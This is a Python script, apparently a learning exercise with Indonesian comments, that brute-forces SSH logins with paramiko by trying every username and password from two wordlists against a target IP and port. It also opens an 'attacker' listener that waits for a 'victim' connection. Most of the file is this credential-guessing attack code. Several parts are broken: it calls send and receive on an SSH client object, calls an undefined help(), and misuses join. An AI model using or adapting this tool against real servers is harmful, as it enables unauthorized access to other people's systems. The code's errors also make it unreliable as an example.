import sys
import socket
import threading
import subprocess
import paramiko
from getopt import getopt

ip = ""
port = 0
usernameList = []
passwordList = []

def sendMesg(connection):
    while True:
        message = input("message to send: ")
        
        connection.send(message.encode())
        if message == "exit":
            connection.close()
            break
def recvMesg(connection):
    while True:
        message = connection.recv(1024).decode()
        if message == "exit":
            connection.close()
            break
        print(f"\nrecieved:{message}")


def appendFromFile(fileSource):
    file =  open(fileSource, "r")
    # print(file.readlines())

    list = []

    for line in file.readlines():

        print(line.strip("\n"))
        list.append(line.strip("\n"))

    return list

def establishConnection():
    for u in usernameList:
        for p in passwordList:
            ssh_client = paramiko.SSHClient()
            
            # set key 
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # coba connect 
            # ip, port, username, password
            # ssh_client.connect(ip, port, u, p)

            try:
                ssh_client.connect(ip, port, u, p)
                print(f"succesfully connected with credential {u}:{p}")
                t1 = threading.Thread(target=sendMesg, args=(ssh_client,))
                t2 = threading.Thread(target=recvMesg, args=(ssh_client,))

                #start 
                t1.start()
                t2.start()
                t1.join()
                t2.join()
            except Exception as e:
                print(f"{u}:{p}, error!~ {e}")

            finally:
                ssh_client.close()
                
                
def ssh():
    
    global usernameList, passwordList

    usernameList = appendFromFile("usernames.txt")
    
    passwordList = appendFromFile("passwords.txt")
    
    #bikin connection ke server
    establishConnection()
    
def attacker_chat_mode():
    server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(("127.0.0.1",port))
    server.listen()
    print("attacker is listening")
    connection, addr =server.accept()
    print (f"coonectec to vivtim: {addr}")
    
    #thread
    t1 = threading.Thread(target=sendMesg, args=(connection,))
    t2 = threading.Thread(target=recvMesg, args=(connection,))

    #start 
    t1.start()
    t2.start()

    t1,t2.join()
    
    
def ipValidation(ip):
    if ip.count(".")!=3:
        return False
    for part in ip.split("."):
        part = int(part)
        if part<0 or part>255:
            return False
    return True
    
def main():
    global ip, port

    # print(sys.argv[1:])
    # paramter: list argumen kita, ada dua option : short dan long 
    opts, argv = getopt(sys.argv[1:], "i:p:h", ["ip=", "port=", "help"])
    # print(f"Opts: {opts}")
    # print(f"Argv: ")

    for opt, value in opts:
        print(f"opt: {opt}, value: {value}")

        if opt == "-i" or opt == "-ip":
            ip = value
        if opt == "-p" or opt == "-port":
            port = int(value)

    print(f"IP: {ip}")
    print(f"PORT: {port}")

    if port == 0:
        print("port is required")
    help()

    if not ipValidation(ip):
        print("invalid ip")
        exit()

    #port validation
    if port >2500 or port <2000:
        print("port must be between 2000 and 2500")
        exit()

    ssh()


main()